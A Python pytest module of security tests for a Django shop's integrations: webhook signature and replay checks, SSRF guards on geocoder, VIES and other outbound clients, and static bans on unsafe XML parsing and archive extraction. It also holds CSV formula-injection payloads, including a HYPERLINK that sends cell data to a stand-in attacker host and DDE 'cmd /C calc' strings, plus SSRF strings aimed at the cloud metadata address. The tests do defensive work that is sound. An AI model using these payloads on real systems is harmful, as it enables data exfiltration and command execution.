"""SEC.5 attack scenarios, category "Integrations" (owner security wave, item 10, part 3b).

Each test plays the attacker against our own code and asserts that the attack fails and leaves
nothing behind. Surfaces on main: one inbound webhook (email bounces and complaints, a signed
JSON stub until ARC.19), the outbound HTTP clients (geocoder, VIES, Turnstile, the tile proxy,
the Stripe client, the health check) and the shipping CSV import and export. No code parses
XML, opens archives or reads XLSX yet; the guards below keep it that way until a task brings a
safe parser. Scenarios that wait for a task (ARC.19 provider event ids, MIG.12 and ING.6 and
ING.9 URL fetchers, archive and XLSX imports, CMP.23 export formulas) are listed on the PR.

Left out on purpose, with the test that already proves it:

- a forged webhook signature, a malformed body, GET, the webhook off without a secret:
  `apps/core/tests/integration/test_email_outbox.py` (the three webhook tests);
- the signature check itself (changed body, old timestamp, no headers):
  `apps/core/tests/unit/test_mail.py::test_signed_feedback_refuses_another_secret_a_changed_body_or_an_old_timestamp`;
- a forged or replayed payment webhook: PAY.2 (lane A) in `apps/payments/tests`;
- the tile proxy never follows a redirect: `apps/core/maps/adapters.py` (`_NoRedirect`) and its
  EVT.14 tests;
- hostile text in shipping files (formulas, markup, control characters):
  `tests/integration/test_hostile_input_outputs.py`;
- an oversized shipping CSV: `apps/shipping/tests/unit/test_config_format.py`.

Dropped: the placeholder for the PAY.2 webhook (done on main). The ingest connectors do
not fetch URLs yet (`apps/ingest` has no outbound call), so there is no ingest SSRF target.
"""

import ast
import contextlib
import json
import re
import secrets
import threading
import urllib.parse
import urllib.request
from collections.abc import Callable, Iterator, Mapping
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import pytest
from django.test import Client, override_settings
from django.urls import reverse
from django.utils import timezone

from apps.accounts import breach, captcha
from apps.core import mail, services
from apps.core.geocoding import AddressQuery, GeocoderUnavailable
from apps.core.geocoding import adapters as geo
from apps.core.models import AuditLog, EmailSuppression
from apps.shipping import config_format as fmt
from apps.tax import vies
from apps.tax.engine import ViesQuery

ROOT = Path(__file__).resolve().parents[2]
SOURCE_DIRS = ("apps", "mpmv")

# --- Webhook forgery and replay ---------------------------------------------------------------


@pytest.fixture
def webhook_secret() -> Iterator[str]:
    secret = secrets.token_urlsafe(32)
    with override_settings(EMAIL_WEBHOOK_SECRET=secret):
        yield secret


def _bounce(recipient: str = "victim@example.com") -> bytes:
    return json.dumps(
        {"events": [{"type": "hard_bounce", "recipient": recipient, "message_id": "m-1"}]}
    ).encode()


def _post(client: Client, body: bytes, headers: Mapping[str, str]) -> Any:
    return client.post(
        reverse("email_webhook"), data=body, content_type="application/json", headers=headers
    )


def _now() -> int:
    return int(timezone.now().timestamp())


def _nothing_recorded() -> bool:
    return not EmailSuppression.objects.exists() and not AuditLog.objects.exists()


# A minute past the 300 s tolerance, not one second: a slow runner took over a second between
# signing and checking, and the "future" case was accepted (main 29ce99c5, 22 Nov).
@pytest.mark.parametrize("skew", [-360, 360, -86_400, 10**9], ids=["old", "future", "day", "far"])
@pytest.mark.django_db
def test_a_webhook_outside_the_timestamp_window_is_refused(
    client: Client, webhook_secret: str, skew: int
) -> None:
    """A correctly signed but stale (or post-dated) request: a captured request replayed later,
    or one signed ahead of time to be replayed in the future."""
    body = _bounce()
    headers = mail.SignedJsonFeedback(webhook_secret).sign(body, timestamp=_now() + skew)
    assert _post(client, body, headers).status_code == 403
    assert _nothing_recorded()


@pytest.mark.django_db
def test_a_signature_is_bound_to_its_timestamp(client: Client, webhook_secret: str) -> None:
    """Moving an old request's timestamp into the window, keeping its signature, fails."""
    body = _bounce()
    old = mail.SignedJsonFeedback(webhook_secret).sign(body, timestamp=_now() - 3_600)
    moved = {**old, mail.TIMESTAMP_HEADER: str(_now())}
    assert _post(client, body, moved).status_code == 403
    assert _nothing_recorded()


@pytest.mark.django_db
def test_a_signature_is_bound_to_its_body(client: Client, webhook_secret: str) -> None:
    """A signed bounce for one address, its body swapped for another victim's: refused."""
    signed = mail.SignedJsonFeedback(webhook_secret).sign(_bounce(), timestamp=_now())
    assert _post(client, _bounce("ceo@example.com"), signed).status_code == 403
    assert _nothing_recorded()


@pytest.mark.parametrize(
    "headers",
    [
        {},
        {mail.TIMESTAMP_HEADER: "now", mail.SIGNATURE_HEADER: "0" * 64},
        {mail.TIMESTAMP_HEADER: "-1", mail.SIGNATURE_HEADER: "0" * 64},
        {mail.TIMESTAMP_HEADER: "1e3", mail.SIGNATURE_HEADER: "0" * 64},
        {mail.TIMESTAMP_HEADER: "", mail.SIGNATURE_HEADER: ""},
    ],
    ids=["none", "word", "negative", "exponent", "empty"],
)
@pytest.mark.django_db
def test_missing_or_malformed_signature_headers_are_refused(
    client: Client, webhook_secret: str, headers: dict[str, str]
) -> None:
    assert _post(client, _bounce(), headers).status_code == 403
    assert _nothing_recorded()


@pytest.mark.django_db
def test_an_unsigned_webhook_secret_cannot_be_guessed_as_empty(client: Client) -> None:
    """With no secret configured the endpoint does not exist; an empty-key signature is no key."""
    with override_settings(EMAIL_WEBHOOK_SECRET=""):
        with pytest.raises(ValueError, match="secret is required"):
            mail.SignedJsonFeedback("")
        assert _post(client, _bounce(), {}).status_code == 404
    assert _nothing_recorded()


@pytest.mark.django_db
def test_a_replayed_webhook_inside_the_window_has_no_second_effect(
    client: Client, webhook_secret: str
) -> None:
    """The same signed request delivered twice (a provider retry or an attacker's replay
    within the 5 minutes): one suppression, one audit entry."""
    body = _bounce()
    headers = mail.SignedJsonFeedback(webhook_secret).sign(body, timestamp=_now())
    assert _post(client, body, headers).status_code == 204
    assert _post(client, body, headers).status_code == 204
    assert EmailSuppression.objects.filter(address="victim@example.com").count() == 1
    assert AuditLog.objects.filter(action="core.email.suppressed").count() == 1
    assert services.is_suppressed("victim@example.com")


# --- SSRF in every outbound URL ---------------------------------------------------------------

# Every place that opens an outbound connection, and why its host cannot be chosen by a user.
# Callers of the apps.core.outbound helpers count as call sites too: the helper refuses
# redirects but does not choose the host, so each caller still needs its own reason.
OUTBOUND_CALL_SITES = {
    "apps/core/outbound.py": "the no-redirect opener; the host is always the caller's",
    "apps/core/geocoding/adapters.py": "fixed provider URLs; the address only in the query",
    "apps/accounts/captcha.py": "the fixed Turnstile siteverify URL",
    "apps/accounts/breach.py": "settings.BREACH_CHECK_URL (https check); only a 5-char hash prefix",
    "apps/tax/vies.py": "settings.VIES_API_URL; the VAT number only in the JSON body",
    "apps/core/maps/adapters.py": "the tile URL template from settings; redirects refused",
    "apps/payments/stripe_client.py": "the fixed Stripe API base (lane A, PAY.2)",
    "apps/ingest/gemini.py": "the fixed Gemini API base; the key is a header, the text a body",
    "mpmv/healthcheck.py": "the container's own loopback health URL",
}
_OUTBOUND = re.compile(
    r"\burlopen\(|\bbuild_opener\(|\bimport (?:requests|httpx|urllib3|aiohttp)\b"
    r"|\bfrom (?:requests|httpx|urllib3|aiohttp)\b|\bHTTPS?Connection\(|\bcreate_connection\("
    r"|\bopen_url\(|\bno_redirect_opener\("
)


def _sources() -> Iterator[tuple[str, str]]:
    for top in SOURCE_DIRS:
        for path in sorted((ROOT / top).rglob("*.py")):
            relative = path.relative_to(ROOT).as_posix()
            if "/tests/" in relative or "/migrations/" in relative:
                continue
            yield relative, path.read_text(encoding="utf-8")


def test_every_outbound_http_call_site_is_reviewed_for_ssrf() -> None:
    """A new module that opens outbound connections fails this test until it is added to
    OUTBOUND_CALL_SITES with the reason its host is safe, or with the SSRF guard the
    placeholders below require for user-supplied URLs."""
    found = {relative for relative, text in _sources() if _OUTBOUND.search(text)}
    assert found == set(OUTBOUND_CALL_SITES)


HOSTILE_ADDRESS = AddressQuery(
    country="it&url=http://169.254.169.254/",
    postcode="@127.0.0.1:5432/",
    city="http://localhost/admin#",
    street="evil.example/?x=\r\nHost: 169.254.169.254",
)


@pytest.mark.parametrize(
    "adapter",
    [
        geo.NominatimGeocoder,
        geo.PhotonGeocoder,
        geo.LocationIQGeocoder,
        geo.OpenCageGeocoder,
    ],
)
def test_a_hostile_address_cannot_steer_the_geocoder(
    adapter: Callable[..., Any], monkeypatch: pytest.MonkeyPatch
) -> None:
    """Whatever is typed in the address form, the request goes to the provider's host: the
    address only ever lands, URL-encoded, in the query string."""
    sent: list[urllib.request.Request] = []

    class Answer:
        def __enter__(self) -> "Answer":
            return self

        def __exit__(self, *args: object) -> None:
            return None

        def read(self) -> bytes:
            return b"[]"

    def fake_open_url(request: urllib.request.Request, *, timeout: float) -> Answer:
        sent.append(request)
        return Answer()

    # The transport opens through the no-redirect helper, bound by name in the adapters module.
    monkeypatch.setattr(geo, "open_url", fake_open_url)
    kwargs: dict[str, Any] = {"transport": geo.http_get_json}
    if adapter in (geo.LocationIQGeocoder, geo.OpenCageGeocoder):
        kwargs["key"] = secrets.token_urlsafe(16)
    else:
        kwargs["user_agent"] = "MPMV/test"
    geocoder = adapter(**kwargs)
    with contextlib.suppress(GeocoderUnavailable):  # "[]" is not every provider's shape
        geocoder.geocode(HOSTILE_ADDRESS, language="en")

    [request] = sent
    expected = urllib.parse.urlsplit(geocoder.url)
    actual = urllib.parse.urlsplit(request.full_url)
    assert (actual.scheme, actual.hostname, actual.port, actual.path) == (
        expected.scheme,
        expected.hostname,
        expected.port,
        expected.path,
    )
    assert actual.fragment == ""
    assert "\r" not in request.full_url
    assert "\n" not in request.full_url
    assert all(name.lower() != "host" for name in request.headers)


def test_a_hostile_vat_number_cannot_steer_the_vies_client() -> None:
    """The VAT number travels in the JSON body; the URL is the configured one."""
    calls: list[tuple[str, Mapping[str, Any]]] = []

    def transport(url: str, data: Mapping[str, Any], timeout: float) -> Mapping[str, Any]:
        calls.append((url, data))
        return {}

    client = vies.HttpViesClient(url="https://vies.example/check", transport=transport)
    client.check(ViesQuery(country="IT", prefix="IT", number="../../@169.254.169.254/x?y#"))
    [(url, body)] = calls
    assert url == "https://vies.example/check"
    assert body["vatNumber"] == "../../@169.254.169.254/x?y#"


class _Recorder(BaseHTTPRequestHandler):
    """A loopback HTTP server that records every request path it gets."""

    hits: list[str]
    redirect_to: str | None

    def _answer(self) -> None:
        self.hits.append(self.path)
        if self.redirect_to:
            self.send_response(302)
            self.send_header("Location", self.redirect_to)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        body = b"{}"
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_GET = _answer
    do_POST = _answer

    def log_message(self, format: str, *args: Any) -> None:
        return None


def _serve(redirect_to: str | None) -> tuple[ThreadingHTTPServer, list[str]]:
    hits: list[str] = []
    handler = type("Handler", (_Recorder,), {"hits": hits, "redirect_to": redirect_to})
    server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, hits


TRANSPORTS: dict[str, Callable[[str], object]] = {
    "geocoder": lambda url: geo.http_get_json(url, {"q": "x"}, {}, 2.0),
    "vies": lambda url: vies.post_json(url, {"vatNumber": "1"}, 2.0),
    "captcha": lambda url: captcha._post_form(url, {"response": "x"}, 2.0),
    "breach": lambda url: breach._get_text(url, {"Add-Padding": "true"}, 2.0),
}


@pytest.mark.parametrize("name", sorted(TRANSPORTS))
def test_an_outbound_transport_does_not_follow_a_redirect_to_another_host(name: str) -> None:
    """A provider answer (or a man in the middle on a misconfigured URL) redirecting to an
    internal address, such as the cloud metadata service, must not be followed. Two loopback
    servers stand in for the provider and the internal target, so no real network is used."""
    target, target_hits = _serve(None)
    provider, provider_hits = _serve(f"http://127.0.0.1:{target.server_port}/latest/meta-data/")
    try:
        with contextlib.suppress(Exception):  # refusing the redirect is the expected outcome
            TRANSPORTS[name](f"http://127.0.0.1:{provider.server_port}/api")
        assert provider_hits
        assert provider_hits[0].startswith("/api")
        assert target_hits == []
    finally:
        provider.shutdown()
        target.shutdown()


# --- XXE, zip slip and formula payloads in imports --------------------------------------------

_UNSAFE_XML_MODULES = ("xml.etree", "xml.dom", "xml.sax", "xml.parsers", "lxml", "xmltodict")


def _imported_modules(text: str) -> Iterator[str]:
    for node in ast.walk(ast.parse(text)):
        if isinstance(node, ast.Import):
            yield from (alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            yield node.module


def test_no_code_parses_xml_without_defusedxml() -> None:
    """XML parsers of the standard library and lxml resolve entities (XXE, billion laughs).
    Code that parses XML must use defusedxml: a module may import the stdlib tree types only
    when it also imports defusedxml (the SVG sanitiser does), and `xml.sax.saxutils` only
    escapes text. This fails as soon as anything else appears."""
    unsafe = []
    for relative, text in _sources():
        modules = list(_imported_modules(text))
        if any(m.startswith("defusedxml") for m in modules):
            continue
        unsafe += [
            f"{relative}: {m}"
            for m in modules
            if m.startswith(_UNSAFE_XML_MODULES) and m != "xml.sax.saxutils"
        ]
    assert sorted(unsafe) == []


def test_no_code_extracts_archives_without_a_path_check() -> None:
    """`extractall` and `unpack_archive` write wherever the member names point (`../../`, absolute
    paths, symlinks). No code may call them; an archive import must go through a helper that
    checks every member path first (placeholder below)."""
    calls = sorted(
        f"{relative}:{node.lineno}"
        for relative, text in _sources()
        for node in ast.walk(ast.parse(text))
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and node.func.attr in {"extractall", "unpack_archive"}
    )
    assert calls == []


FORMULAS = [
    '=HYPERLINK("http://attacker.example/?"&A1,"Click")',
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
    "'=already quoted",
]


def _document_with(name: str) -> dict[str, Any]:
    return {
        "format": fmt.FORMAT,
        "version": fmt.VERSION,
        "country_groups": [],
        "zones": [
            {
                "code": "home",
                "name": name,
                "priority": 100,
                "countries": ["FR"],
                "country_groups": [],
                "postcode_patterns": [],
                "states": [],
            }
        ],
        "methods": [],
        "pickup_options": [{"key": "shop", "cost_net": "-1.50", "address": name}],
        "special_areas": [],
    }


def _cells(text: str) -> list[str]:
    import csv
    import io

    return [cell for row in csv.reader(io.StringIO(text)) for cell in row]


@pytest.mark.parametrize("payload", FORMULAS)
def test_the_shipping_csv_export_neutralises_formula_payloads(payload: str) -> None:
    """A zone name or pickup address set to a spreadsheet formula (by a vendor, or by an
    imported file) is exported as text: no cell of the CSV starts with a formula trigger."""
    exported = fmt.dump_csv(_document_with(payload))
    for cell in _cells(exported):
        assert not re.match(r"[=+\-@\t\r]", cell) or re.fullmatch(r"-?\d+(\.\d+)?", cell), cell


@pytest.mark.parametrize("payload", FORMULAS)
def test_a_formula_payload_round_trips_as_the_same_text(payload: str) -> None:
    """The escape is undone on import: exporting and importing gives back the exact text, and
    numbers such as a negative amount are not escaped."""
    exported = fmt.dump_csv(_document_with(payload))
    parsed = fmt.parse_csv(exported)
    assert parsed.ok, parsed.issues
    document = fmt.to_document(parsed)
    assert document["zones"][0]["name"] == payload
    assert document["pickup_options"][0]["address"] == payload
    assert document["pickup_options"][0]["cost_net"] == "-1.50"
